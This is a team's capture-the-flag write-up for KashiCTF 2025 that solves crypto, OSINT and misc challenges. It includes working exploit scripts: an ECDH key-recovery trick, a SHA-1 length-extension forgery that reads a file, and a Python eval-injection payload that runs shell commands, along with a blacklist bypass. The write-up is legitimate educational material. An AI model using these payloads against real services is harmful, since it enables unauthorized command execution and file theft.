---
title: KashiCTF 2025 Writeups
published: 2025-02-28
description: Writeups for KashiCTF 2025 challenges
tags: [Forensics, Pwn, Crypto, Web, Misc]
category: Writeups
author: nh0kt1g3r12, kAiz3n, nukoneZ, t4t3012, _biscuit.cz
draft: false

---

# Kashi CTF 2025 Writeup

Hi guys, this is f4n_n3r0, we're so lucky to finish the competition in 7th place / 729 teams (since some teams got disqualifed...) this is our team writeup for all the challenges we have solved so far in this CTF, enjoy guys!
![image](https://hackmd.io/_uploads/rJMWkrq91e.png)


## Crypto
### Lost Frequencies
> Author: kywh1t3h4t

![image](https://hackmd.io/_uploads/BJadxZ95Jx.png)
- In this challenge I used this tool to decode morse code.
  https://www.dcode.fr/morse-code
![image](https://hackmd.io/_uploads/S1CSbZ5cJl.png)
```
Flag: KashiCTF{OHNOBINARYMORSE}
```
### Key Exchange
>Author: t4t3012
>Description: Someone wants to send you a message. But they want something from you first.
![image](https://hackmd.io/_uploads/rk2IUf991l.png)

Source code of `server.py`:
```python=
from redacted import EllipticCurve, FLAG, EXIT
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
import random
import json
import os

def encrypt_flag(shared_secret: int):
    sha1 = hashlib.sha1()
    sha1.update(str(shared_secret).encode("ascii"))
    key = sha1.digest()[:16]
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(FLAG, 16))
    data = {}
    data["iv"] = iv.hex()
    data["ciphertext"] = ciphertext.hex()
    return json.dumps(data)

#Curve Parameters (NIST P-384)
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575
E = EllipticCurve(p,a,b)
G = E.point(26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087,8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871)

n_A = random.randint(2, p-1)
P_A = n_A * G

print(f"\nReceived from Weierstrass:")
print(f"   Here are the curve parameters (NIST P-384)")
print(f"   {p = }")
print(f"   {a = }")
print(f"   {b = }")
print(f"   And my Public Key: {P_A}")

print(f"\nSend to Weierstrass:")
P_B_x = int(input("   Public Key x-coord: "))
P_B_y = int(input("   Public Key y-coord: "))

try:
    P_B = E.point(P_B_x, P_B_y)
except:
    EXIT()

S = n_A * P_B

print(f"\nReceived from Weierstrass:")
print(f"   Message: {encrypt_flag(S.x)}")

```
- In this challenge, we are given an **Elliptic Curve Diffie-Hellman (ECDH) key exchange** implementation, where a shared secret is used to derive an **AES-CBC encryption key**. The server interacts as follows:

1. **Server generates a keypair:** 
   - Chooses a random private key `n_A`.  
   - Computes the public key `P_A = n_A * G`.  
   - Sends `P_A` along with curve parameters.
2. **User sends their public key `P_B`**  
   - The server receives `P_B = (P_B_x, P_B_y)`.  
   - It computes the shared secret: `S = n_A * P_B`.  
   - Uses `S.x` (the x-coordinate of `S`) to derive the AES key.

3. **Flag Encryption**  
   - The server encrypts the flag with AES-CBC using the derived key:
     ```python
     key = SHA-1(S.x)[:16]
     cipher = AES.new(key, AES.MODE_CBC, iv)
     ```
   - The ciphertext and IV are sent to the user.
#### **Vulnerability Analysis**  
- The critical flaw is **the ability to control `P_B`**:
    - Since `S = n_A * P_B`, choosing `P_B = G` (the generator) forces:
      \[
      S = n_A * G = P_A
      \]
      Meaning **`S.x = P_A.x`**, which is already public!  
    - This allows us to **compute the exact AES key** without knowing `n_A`.
#### **Exploitation Steps**
##### **1. Extract `P_A.x` from the server**
- The server prints its public key `P_A = (P_A.x, P_A.y)`.
- We extract `P_A.x` from this output.

##### **2. Send `P_B = G`**
- We respond with `P_B = G`, which makes `S = P_A`.

##### **3. Compute the AES Key**
- Since `S.x = P_A.x`, the key is derived as:
     ```python
  sha1 = hashlib.sha1()
  sha1.update(str(P_A_x).encode("ascii"))
  key = sha1.digest()[:16]
  ```
And this is my script to solve it:
```python=
from pwn import *
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import hashlib
import json

# Connect to the server
io = remote("kashictf.iitbhucybersec.in", 61188)

# Receive public key from server
io.recvuntil(b"And my Public Key: ")
P_A_str = io.recvline().strip().decode()

# Extract x-coordinate of P_A
P_A_x = int(P_A_str.split(",")[0].split("(")[1])

# Send P_B = G to force S = P_A
io.sendlineafter(b"Public Key x-coord: ", str(26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087).encode())
io.sendlineafter(b"Public Key y-coord: ", str(8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871).encode())

# Receive encrypted flag
io.recvuntil(b"Message: ")
data = json.loads(io.recvline().strip().decode())

iv = bytes.fromhex(data["iv"])
ciphertext = bytes.fromhex(data["ciphertext"])

# Generate AES key from P_A.x
sha1 = hashlib.sha1()
sha1.update(str(P_A_x).encode("ascii"))
key = sha1.digest()[:16]

# Decrypt AES-CBC
cipher = AES.new(key, AES.MODE_CBC, iv)
flag = unpad(cipher.decrypt(ciphertext), 16)

print(flag.decode())
```
![image](https://hackmd.io/_uploads/SkhaH7c91e.png)
It will give you flag has been encrypted and Hint
I think Hint is key to decrypt
![image](https://hackmd.io/_uploads/H1I8Lm95yl.png)
Flag:`KashiCTF{I_r3V3Al3d_my_Pub1Ic_K3y_4nd_4ll_1_g0t_w4s_th1s_L0usy_Fl4G_8CoGNJGx}`
### MMDLX
>Author: nh0kt1g3r12


![image](https://hackmd.io/_uploads/HkunnQ99Jx.png)
>Description: Although I know only a fraction of their history, but I think Romans have done many weird things in life. But this is a very basic challenge, right?

I was given a text file with long base64 text. According to the description, the cipher must be something very related to Roman Cipher, the most popular Roman Cipher is Caesar Cipher, which is rotating character. My idea is to use the very very basic shift of Caesar Cipher, which is 3, to rotate the text, then decoding it with base64, and find if the decoded text contains `KashiCTF`, here is the solve script for it.
```python=
import base64
import os

def caesar_cipher(text, shift):
    """Shifts letters forward or backward in the alphabet based on shift value."""
    transformed = ''
    for char in text:
        if char.isalpha():
            offset = ord('A') if char.isupper() else ord('a')
            transformed += chr((ord(char) - offset + shift) % 26 + offset)
        else:
            transformed += char
    return transformed

def read_file(filename):
    """Reads and returns contents of a file if it exists."""
    if not os.path.isfile(filename):
        print(f"Error: {filename} not found.")
        return None
    with open(filename, "r") as file:
        return file.read().strip()

def iterative_base64_decode(encoded_text):
    """Decodes Base64 iteratively until the expected flag format is found."""
    attempt = 1
    while not encoded_text.lower().startswith("kashictf{"):
        try:
            encoded_text = base64.b64decode(encoded_text).decode('utf-8')
            print(f"Attempt {attempt}: {encoded_text[:20]}")
            attempt += 1
        except Exception as err:
            print("Decoding failed:", err)
            break
    return encoded_text

def main():
    """Main execution flow."""
    input_text = read_file("MMDLX.txt")
    if input_text is None:
        return
    
    decrypted_text = caesar_cipher(input_text, 3)
    final_output = iterative_base64_decode(decrypted_text)
    
    print("\nFinal Decoded Output:")
    print(final_output)

if __name__ == "__main__":
    main()
    #KashiCTF{w31rd_numb3r5_4nd_c1ph3r5}
```
***Flag: KashiCTF{w31rd_numb3r5_4nd_c1ph3r5}***
## Osint
### Who am I ??
![image](https://hackmd.io/_uploads/HkSOkfq9Je.png)
>Author: nh0kt1g3r12
> Description: You've stumbled upon a bustling street with political posters. Find out after which politician this road is named. Flag Format: KashiCTF{Full_Name}
Flag format clarification: The full name is in Title_Case, without any diacritics, with each "special character (anything other than a-zA-Z)" replaced by an underscore.

![Road_Not_Taken](https://hackmd.io/_uploads/BkQQlM991g.jpg)

As you can see, we can guess the name of the business building in the image. It can only be `Duna House` or `Duna Hotel`. Searching these twos on the Internet, the building in the image is belonged to `Duna House`. Searching Duna House on Google Maps, I found the place.
![Screenshot_2025-02-24_224116_1_optimized_1000](https://hackmd.io/_uploads/HyrY7G591e.png)
It is located on the Bajcsy-Zsilinszky út road, searching `Bajcsy-Zsilinszky` on Google, I found the politician.
![Screenshot_2025-02-24_224429_optimized_1000](https://hackmd.io/_uploads/S1XE4fc91e.png)
So the flag is:
***Flag: KashiCTF{Endre_Bajcsy_Zsilinszky}***
### Kings
>Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/SyHB8M9cJl.png)
>Description: Did you know the cosmic weapons like this? I found similar example of such weapons on the net and it was even weirder. This ruler's court artist once drew the most accurate painting of a now extinct bird. Can you tell me the coordinates upto 4 decimal places of the place where this painting is right now.
Flag Format: KashiCTF{XX.XXXX_YY.YYYY}

Because I didn't understand the description clearly, I used ChatGPT to analyze it, after that, I easily got the location of the painting :skull_and_crossbones:.
![image](https://hackmd.io/_uploads/BJzxwzqcJe.png)

By using Google Maps once again, I got the exact coordinates of the location: 
![Screenshot_2025-02-24_225741_1_optimized_1000](https://hackmd.io/_uploads/S1ljDf5cke.png)

***Flag: KashiCTF{59.9399, 30.3149}***

### Old Diner
>Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/rJBNz7qqyx.png)
>Description: 
>My friend once visited this place that served ice cream with coke. He said he had the best Greek omlette of his life and called it a very american experience. Can you find the name of the diner and the amount he paid?
Flag Format: KashiCTF{Name_of_Diner_Amount}
For clarification on the flag format The diner's name is in title case with spaces replaced by underscores. The amount is without currency sign, and in decimal, correct to two decimal places, i.e. KashiCTF{Full_Diner_Name_XX.XX}

Searching on Google the term "diner that serves ice cream with coke", I got my answer: 
![image](https://hackmd.io/_uploads/BygqMm9qJx.png)
At first, I thought the purpose of the challenge was to search for the price of the Greek Omlette, after a while, I realized that I was wrong. The challenge asks for the amount that the author's friend paid, so we have to look for his bill first. Google Reviews didn't give any good results so I looked it up on Tripadvisor with the term "Greek omlette" and "very american experience".
![image](https://hackmd.io/_uploads/rkDO7Xcq1e.png)
And there we go
![image](https://hackmd.io/_uploads/B1ucQ7q5Je.png)

***Flag: KashiCTF{Lexington_Candy_Shop_41.65}***

## Misc

### Easy Jail
>Author: nh0kt1g3r12

![image](https://hackmd.io/_uploads/BkgWBG99ke.png)
>Description: I made this calculator. I have a feeling that it's not safe :(

Source code:
```python=
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		calc(inp)

if __name__ == '__main__':
	main()
```
The server is using eval to calculate our input without sanitizing it. According to `Dockerfile`, the flag is located at `/flag.txt`. By using `__import__('os').system('cat /flag.txt')`, we can easily get the flag:
![image](https://hackmd.io/_uploads/SJZeUfqcye.png)
***Flag: KashiCTF{3V4L_41NT_54F3_KUU18YrS}***

### Easy Jail 2
![image](https://hackmd.io/_uploads/rywoz-q9Jx.png)
> Desription: `I made a completely secure calculator this time.`
> Author: t4t3012
- Here is the source code of `chall.py`:
```python=
#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		if any(bad in inp for bad in BLACKLIST) :
			print("Are you tying to hack me !!!!!")
		else : 
			calc(inp)

if __name__ == '__main__':
	main()#!/usr/bin/env python3

print("           _            _       _             ")
print("          | |          | |     | |            ")
print("  ___ __ _| | ___ _   _| | __ _| |_ ___  _ __ ")
print(" / __/ _` | |/ __| | | | |/ _` | __/ _ \| '__|")
print("| (_| (_| | | (__| |_| | | (_| | || (_) | |   ")
print(" \___\__,_|_|\___|\__,_|_|\__,_|\__\___/|_|   ")

BLACKLIST = ["open", "input", "eval", "exec", "import", "getattr", "sh", "builtins", "global"]
def calc(op):
	try : 	
		res = eval(op)
	except :
		return print("Wrong operation")
	return print(f"{op} --> {res}")

def main():
	while True :
		inp = input(">> ")
		if any(bad in inp for bad in BLACKLIST) :
			print("Are you tying to hack me !!!!!")
		else : 
			calc(inp)

if __name__ == '__main__':
	main()
```
- Because `breakpoint()` not have in BLACKLIST,I will use `breakpoint()` to debug
- The `breakpoint()` function in Python is used to pause the execution of a program and start an interactive debugging session. It is essentially a built-in way to invoke the Python debugger (pdb) or any other configured debugging tool.
![image](https://hackmd.io/_uploads/BJ0y4ZcqJg.png)
- And we will use command in pdb to get flag
![image](https://hackmd.io/_uploads/rybrHbq5yl.png)
- Flag: `KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_0t95kOum}`
### Game 2 - Wait
![image](https://hackmd.io/_uploads/Bk8huZ9ckl.png)
>[wait.exe](https://drive.google.com/file/d/1GDYmOiW54pPLFxfQaBOOS5IPEAoplFPy/view?usp=drive_link)
>Author: t4t3012

![image](https://hackmd.io/_uploads/H1E_t-951g.png)
- I see this file is built from Godot
- I will use [GDRETools](https://github.com/GDRETools/gdsdecomp) to recover godot project to view source
![image](https://hackmd.io/_uploads/Hyg1iZqc1e.png)
- And i have godot file
- I will use `Godot Engine` to view this file
```csharp=
extends Node2D

var pos = [Vector2(232,128),Vector2(232,80),Vector2(232,96),Vector2(232,112),Vector2(232,144),Vector2(232,160),Vector2(232,176),Vector2(248,112),Vector2(265,103),Vector2(281,87),Vector2(248,128),Vector2(264,144),Vector2(272,160),Vector2(280,176),Vector2(343,120),Vector2(327,128),Vector2(319,144),Vector2(319,160),Vector2(327,176),Vector2(343,176),Vector2(359,176),Vector2(367,160),Vector2(367,144),Vector2(367,128),Vector2(359,120),Vector2(375,168),Vector2(391,176),Vector2(343,120),Vector2(327,128),Vector2(327,176),Vector2(343,176),Vector2(359,176),Vector2(367,160),Vector2(367,144),Vector2(367,128),Vector2(359,120),Vector2(375,168),Vector2(391,176),Vector2(335,376),Vector2(335,360),Vector2(335,344),Vector2(335,328),Vector2(335,312),Vector2(335,296),Vector2(351,328),Vector2(367,320),Vector2(375,304),Vector2(375,376),Vector2(415,376),Vector2(415,360),Vector2(415,344),Vector2(415,328),Vector2(415,312),Vector2(415,296),Vector2(431,312),Vector2(447,304),Vector2(463,296),Vector2(367,360),Vector2(351,344),Vector2(471,104),Vector2(455,104),Vector2(439,104),Vector2(423,112),Vector2(423,128),Vector2(423,144),Vector2(439,144),Vector2(455,144),Vector2(471,144),Vector2(471,160),Vector2(463,177),Vector2(455,177),Vector2(439,177),Vector2(423,177),Vector2(513,89),Vector2(513,121),Vector2(513,137),Vector2(513,153),Vector2(513,169),Vector2(513,177),Vector2(513,105),Vector2(529,145),Vector2(545,145),Vector2(553,153),Vector2(553,169),Vector2(553,177),Vector2(185,291),Vector2(185,323),Vector2(185,339),Vector2(185,355),Vector2(185,371),Vector2(185,379),Vector2(185,307),Vector2(201,347),Vector2(217,347),Vector2(225,355),Vector2(225,371),Vector2(225,379),Vector2(977,291),Vector2(977,323),Vector2(977,339),Vector2(977,355),Vector2(977,371),Vector2(977,379),Vector2(977,307),Vector2(993,347),Vector2(1009,347),Vector2(1017,355),Vector2(1017,371),Vector2(1017,379),Vector2(593,177),Vector2(593,161),Vector2(593,145),Vector2(593,129),Vector2(593,89),Vector2(693,84),Vector2(677,84),Vector2(661,84),Vector2(645,84),Vector2(629,84),Vector2(629,100),Vector2(629,116),Vector2(629,132),Vector2(629,148),Vector2(629,164),Vector2(629,180),Vector2(645,180),Vector2(661,180),Vector2(677,180),Vector2(693,180),Vector2(149,284),Vector2(133,284),Vector2(117,284),Vector2(101,284),Vector2(85,284),Vector2(85,300),Vector2(85,316),Vector2(85,332),Vector2(85,348),Vector2(85,364),Vector2(85,380),Vector2(101,380),Vector2(117,380),Vector2(133,380),Vector2(149,380),Vector2(733,84),Vector2(749,84),Vector2(765,84),Vector2(781,84),Vector2(797,84),Vector2(765,100),Vector2(765,116),Vector2(765,132),Vector2(765,148),Vector2(765,164),Vector2(765,180),Vector2(853,180),Vector2(853,164),Vector2(853,148),Vector2(853,132),Vector2(853,116),Vector2(853,100),Vector2(853,84),Vector2(869,84),Vector2(885,84),Vector2(901,84),Vector2(917,84),Vector2(869,124),Vector2(885,124),Vector2(901,124),Vector2(45,260),Vector2(29,276),Vector2(37,292),Vector2(37,308),Vector2(29,324),Vector2(13,340),Vector2(29,353),Vector2(37,369),Vector2(37,385),Vector2(29,400),Vector2(45,416),Vector2(45,416),Vector2(1062,257),Vector2(1076,270),Vector2(1068,286),Vector2(1068,302),Vector2(1076,318),Vector2(1092,334),Vector2(1077,350),Vector2(1069,366),Vector2(1069,382),Vector2(1077,398),Vector2(1061,414),Vector2(29,276),Vector2(37,292),Vector2(37,308),Vector2(29,324),Vector2(13,340),Vector2(29,353),Vector2(37,369),Vector2(37,385),Vector2(29,400),Vector2(45,416),Vector2(45,416),Vector2(301,336),Vector2(301,352),Vector2(301,368),Vector2(301,376),Vector2(301,320),Vector2(301,304),Vector2(285,344),Vector2(269,344),Vector2(253,344),Vector2(261,336),Vector2(269,320),Vector2(285,304),Vector2(301,288),Vector2(525,336),Vector2(525,352),Vector2(525,368),Vector2(525,376),Vector2(565,376),Vector2(581,376),Vector2(597,376),Vector2(613,376),Vector2(629,376),Vector2(717,376),Vector2(701,360),Vector2(693,344),Vector2(685,328),Vector2(677,312),Vector2(669,296),Vector2(661,280),Vector2(733,362),Vector2(741,346),Vector2(749,330),Vector2(757,314),Vector2(765,298),Vector2(773,282),Vector2(797,322),Vector2(805,338),Vector2(821,354),Vector2(837,346),Vector2(845,330),Vector2(851,318),Vector2(819,366),Vector2(811,382),Vector2(891,318),Vector2(891,334),Vector2(891,350),Vector2(891,366),Vector2(899,382),Vector2(915,382),Vector2(931,382),Vector2(939,374),Vector2(939,358),Vector2(939,342),Vector2(939,326),Vector2(939,318),Vector2(525,320),Vector2(525,304),Vector2(509,344),Vector2(493,344),Vector2(477,344),Vector2(485,336),Vector2(493,320),Vector2(509,304),Vector2(525,288)]
var curr_pos = []


var ct
var time_left=172800

func _process(delta):
	var curr_time = Time.get_datetime_dict_from_system()
	time_left = (ct.month-curr_time.month)*86400*30+(ct.year-curr_time.year)*86400*30*12+(ct.day-curr_time.day)*86400+(ct.hour-curr_time.hour)*3600+(ct.minute-curr_time.minute)*60+(ct.second-curr_time.second)
	time_left=max(0,time_left)
	$Label.text = str(time_left)
	update()
	
func _ready():
	ct = Time.get_datetime_dict_from_system()
	ct.day +=2
	for i in range($pixels.get_child_count()):
		var t = Vector2(randi_range(0,1140),randi_range(0,560))
		
		$pixels.get_child(i).global_position = t
		curr_pos.append(t)
	
func update():
	for i in range($pixels.get_child_count()):
		var dir = pos[i]-curr_pos[i]
		$pixels.get_child(i).global_position = (1-float(time_left)/172800)*dir+ curr_pos[i]

		
func _unhandled_input(event):
	if Input.is_action_just_pressed("esc"):
		get_tree().quit()
```
- when running it will take a long time to get the flag, so we have to optimize the time
- This is my script: 
```python=
import pygame
import random
from datetime import datetime, timedelta

pygame.init()
WIDTH, HEIGHT = 1140, 560
screen = pygame.display.set_mode((WIDTH, HEIGHT))
clock = pygame.time.Clock()

pos = [
    (232, 128), (232, 80), (232, 96), (232,
                                       112), (232, 144), (232, 160), (232, 176),
    (232, 128), (232, 80), (232, 96), (232,
                                       112), (232, 144), (232, 160), (232, 176),
    (248, 112), (265, 103), (281, 87), (248,
                                        128), (264, 144), (272, 160), (280, 176),
    (343, 120), (327, 128), (319, 144), (319,
                                         160), (327, 176), (343, 176), (359, 176),
    (367, 160), (367, 144), (367, 128), (359,
                                         120), (375, 168), (391, 176), (343, 120),
    (327, 128), (327, 176), (343, 176), (359,
                                         176), (367, 160), (367, 144), (367, 128),
    (359, 120), (375, 168), (391, 176), (335,
                                         376), (335, 360), (335, 344), (335, 328),
    (335, 312), (335, 296), (351, 328), (367,
                                         320), (375, 304), (375, 376), (415, 376),
    (415, 360), (415, 344), (415, 328), (415,
                                         312), (415, 296), (431, 312), (447, 304),
    (463, 296), (367, 360), (351, 344), (471,
                                         104), (455, 104), (439, 104), (423, 112),
    (423, 128), (423, 144), (439, 144), (455,
                                         144), (471, 144), (471, 160), (463, 177),
    (455, 177), (439, 177), (423, 177), (513,
                                         89), (513, 121), (513, 137), (513, 153),
    (513, 169), (513, 177), (513, 105), (529,
                                         145), (545, 145), (553, 153), (553, 169),
    (553, 177), (185, 291), (185, 323), (185,
                                         339), (185, 355), (185, 371), (185, 379),
    (185, 307), (201, 347), (217, 347), (225,
                                         355), (225, 371), (225, 379), (977, 291),
    (977, 323), (977, 339), (977, 355), (977,
                                         371), (977, 379), (977, 307), (993, 347),
    (1009, 347), (1017, 355), (1017, 371), (1017,
                                            379), (593, 177), (593, 161), (593, 145),
    (593, 129), (593, 89), (693, 84), (677,
                                       84), (661, 84), (645, 84), (629, 84), (629, 100),
    (629, 116), (629, 132), (629, 148), (629,
                                         164), (629, 180), (645, 180), (661, 180),
    (677, 180), (693, 180), (149, 284), (133,
                                         284), (117, 284), (101, 284), (85, 284),
    (85, 300), (85, 316), (85, 332), (85, 348), (85,
                                                 364), (85, 380), (101, 380), (117, 380),
    (133, 380), (149, 380), (733, 84), (749,
                                        84), (765, 84), (781, 84), (797, 84), (765, 100),
    (765, 116), (765, 132), (765, 148), (765,
                                         164), (765, 180), (853, 180), (853, 164),
    (853, 148), (853, 132), (853, 116), (853,
                                         100), (853, 84), (869, 84), (885, 84),
    (901, 84), (917, 84), (869, 124), (885, 124), (901, 124), (45, 260), (29, 276),
    (37, 292), (37, 308), (29, 324), (13, 340), (29,
                                                 353), (37, 369), (37, 385), (29, 400),
    (45, 416), (45, 416), (1062, 257), (1076,
                                        270), (1068, 286), (1068, 302), (1076, 318),
    (1092, 334), (1077, 350), (1069, 366), (1069,
                                            382), (1077, 398), (1061, 414), (29, 276),
    (37, 292), (37, 308), (29, 324), (13, 340), (29,
                                                 353), (37, 369), (37, 385), (29, 400),
    (45, 416), (45, 416), (301, 336), (301,
                                       352), (301, 368), (301, 376), (301, 320),
    (301, 304), (285, 344), (269, 344), (253,
                                         344), (261, 336), (269, 320), (285, 304),
    (301, 288), (525, 336), (525, 352), (525,
                                         368), (525, 376), (565, 376), (581, 376),
    (597, 376), (613, 376), (629, 376), (717,
                                         376), (701, 360), (693, 344), (685, 328),
    (677, 312), (669, 296), (661, 280), (733,
                                         362), (741, 346), (749, 330), (757, 314),
    (765, 298), (773, 282), (797, 322), (805,
                                         338), (821, 354), (837, 346), (845, 330),
    (851, 318), (819, 366), (811, 382), (891,
                                         318), (891, 334), (891, 350), (891, 366),
    (899, 382), (915, 382), (931, 382), (939,
                                         374), (939, 358), (939, 342), (939, 326),
    (939, 318), (525, 320), (525, 304), (509,
                                         344), (493, 344), (477, 344), (485, 336),
    (493, 320), (509, 304), (525, 288)
]


def generate_initial_positions():
    return [(
        random.randint(max(0, target[0] - 200), min(WIDTH, target[0] + 200)),
        random.randint(max(0, target[1] - 200), min(HEIGHT, target[1] + 200))
    ) for target in pos]


curr_pos = generate_initial_positions()

start_time = pygame.time.get_ticks()
animation_duration = 5000 

font = pygame.font.SysFont(None, 36)

running = True
while running:
    current_time = pygame.time.get_ticks()
    elapsed_time = current_time - start_time

    progress = min(elapsed_time / animation_duration, 1.0)

    for event in pygame.event.get():
        if event.type == pygame.QUIT or (event.type == pygame.KEYDOWN and event.key == pygame.K_ESCAPE):
            running = False

    screen.fill((0, 0, 0))

    for i, (start_pos, target_pos) in enumerate(zip(curr_pos, pos)):
        x = int(start_pos[0] + (target_pos[0] - start_pos[0]) * progress)
        y = int(start_pos[1] + (target_pos[1] - start_pos[1]) * progress)
        pygame.draw.circle(screen, (255, 255, 255), (x, y), 2)

    time_left = max(0, animation_duration - elapsed_time)
    text = font.render(f"{time_left/1000:.1f}s", True, (255, 255, 255))
    screen.blit(text, (10, 10))

    pygame.display.flip()

    if progress >= 1.0:
        pygame.time.wait(1000)
        running = False

    clock.tick(60)

pygame.quit()
```
![image](https://hackmd.io/_uploads/Skcf0W5qJg.png)
- Flag: `KashiCTF{Ch4kr4_Vyuh}`

### Broken?
![image](https://hackmd.io/_uploads/HkTqu7qc1g.png)
>Author: t4t3012
>Description: You find his laptop lying there and his futile attempt to read a random file..!
>[chall.py](https://kashictf.iitbhucybersec.in/files/b3c838f1c70fa95318da9780ab498a17/chall.py?token=eyJ1c2VyX2lkIjoxODksInRlYW1faWQiOjEwOSwiZmlsZV9pZCI6Mjd9.Z7ymnQ.67OpNYZE8Bc9MoqGlWTiXks198c)
- source code of `chall.py`:
```python=
#!/usr/bin/env python3

import hashlib
import socket
import signal
import sys

HOST = "0.0.0.0"
PORT = 1337
SECRET_KEY = b"REDACTED"

def generate_hmac(message):
    return hashlib.sha1(SECRET_KEY + message.encode()).hexdigest()

def signal_handler(sig, frame):
    print("\n[!] Server shutting down...")
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def handle_client(client, addr):
    print(f"[*] Connection from {addr}")

    try:
        original_data = "count=10&lat=37.351&user_id=1&long=-119.827&file=random.txt"
        original_hmac = generate_hmac(original_data)

        client.sendall(f"Retrieve file using format: data|hmac\nExample: {original_data}|{original_hmac}\n".encode())

        data = client.recv(1024)
        if not data:
            print(f"[-] Client {addr} disconnected.")
            return

        try:
            decoded_data = data.decode("utf-8").strip()
        except UnicodeDecodeError:
            decoded_data = data.decode("latin-1").strip()

        print(f"[*] Received Data: {decoded_data}")

        if "|" not in decoded_data:
            client.sendall(b"Invalid format. Use data|hmac\n")
            return

        user_data, received_hmac = decoded_data.rsplit("|", 1)

        user_data_bytes = bytes(user_data, "utf-8").decode("unicode_escape").encode("latin-1")

        h = hashlib.sha1()
        h.update(SECRET_KEY + user_data_bytes)
        computed_signature = h.hexdigest()

        print(f"[*] Computed Signature: {computed_signature} for body: {repr(user_data)}")
        print(f"[*] Received Signature: {received_hmac}")

        if computed_signature != received_hmac:
            client.sendall(b"Invalid HMAC. Try again.\n")
        else:
            try:
                params = dict(param.split("=") for param in user_data.split("&") if "=" in param)
                filename = params.get("file")
                if filename:
                    with open(filename, "r") as f:
                        content = f.read()
                    client.sendall(f"File Contents:\n{content}\n".encode())
                else:
                    client.sendall(b"Invalid request format.\n")
            except FileNotFoundError:
                client.sendall(b"File not found.\n")

    except ConnectionResetError:
        print(f"[!] Client {addr} forcibly disconnected.")

    except Exception as e:
        print(f"[!] Error handling client {addr}: {e}")

    finally:
        client.close()
        print(f"[-] Closed connection with {addr}")

def start_server():
    print(f"[*] Listening on {HOST}:{PORT} ...")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    while True:
        try:
            client, addr = server.accept()
            handle_client(client, addr)
        except KeyboardInterrupt:
            print("\n[!] Shutting down server...")
            server.close()
            sys.exit(0)

if __name__ == "__main__":
    start_server()
```
- The HMAC is generated using `sha1(SECRET_KEY + message)`.
- The server checks for the format `data|hmac` and verifies the signature
- If the HMAC is valid, it reads the file from the `file` parameter and returns its content.
- The HMAC uses SHA-1 with `HMAC(key + message)`, making it vulnerable to **Length Extension Attack**.
- We have `original_data` and `original_hmac`, but we don't know `SECRET_KEY`.
- We use `hashpumpy` to extend the data and compute a valid HMAC without knowing the key.
- Here is my script to exploit:
```python=
import hashpumpy
from pwn import *

origin_data = "count=10&lat=37.351&user_id=1&long=-119.827&file=random.txt"
origin_hash = "01be4a249bed4886b93d380daba91eb4a0b1ee29"
inject_data = "&file=flag.txt"
target = ("kashictf.iitbhucybersec.in", 15687)


def format_bytes(b):
    s = ""
    for c in b:
        if c == 92:
            s += "\\\\"
        elif c == 13:
            s += "\\r"
        elif c == 10:
            s += "\\n"
        elif 32 <= c <= 126:
            s += chr(c)
        else:
            s += f"\\x{c:02x}"
    return s


for key_len in range(1, 32):
    new_hash, new_data = hashpumpy.hashpump(
        origin_hash, origin_data, inject_data, key_len)

    conn = remote(*target)
    conn.sendlineafter("Example:", f"{format_bytes(new_data)}|{new_hash}")

    try:
        resp = conn.recvall(timeout=2)
        if b"File Contents" in resp:
            print(f"Success with key length {key_len}")
            print(resp.decode())
            break
    except:
        pass
    finally:
        conn.close()
```
![image](https://hackmd.io/_uploads/BJYk2mq9Je.png)
- Flag: `KashiCTF{Close_Yet_Far_sHBO2UOM3}`
### Self Destruct
>Author: kAiZ3n


![image](https://hackmd.io/_uploads/ry-1Qf99Jl.png)
>Description
>Explore the virtual machine and you might just find the flag. Or a surprise. Maybe....
NOTE: The attachment is a VirtualBox image. Do not run it outside VirtualBox. It is recommended to backup the .vdi file before launching the VM.
VM Parameters: (VirtualBox)
Type: Linux
Version: Debian (32 bits)
RAM: 1024MB
Storage: attached .vdi file
Username: kashictf
Password: kashictf
Attachments: Self Destruct Debian.vdi


I got a vdi (virtual Desktop Infrastructure)
I process mounting it on kali
```
#Installing qemu-nbd 
sudo apt update && sudo apt install -y qemu-utils
sudo modprobe nbd max_part=8
#connect file with /dev/nbd0
sudo qemu-nbd --connect=/dev/nbd0 Self\ Destruct\ Debian.vdi 
#mount it in /mnt/vdi
sudo mount /dev/nbd0p1 /mnt/vdi
#go ahead /mnt/vdi
and then grep -r -i 'flag' . > logFlag.txt
cat logFlag.txt
```

![image](https://hackmd.io/_uploads/SyhGHM59kl.png)
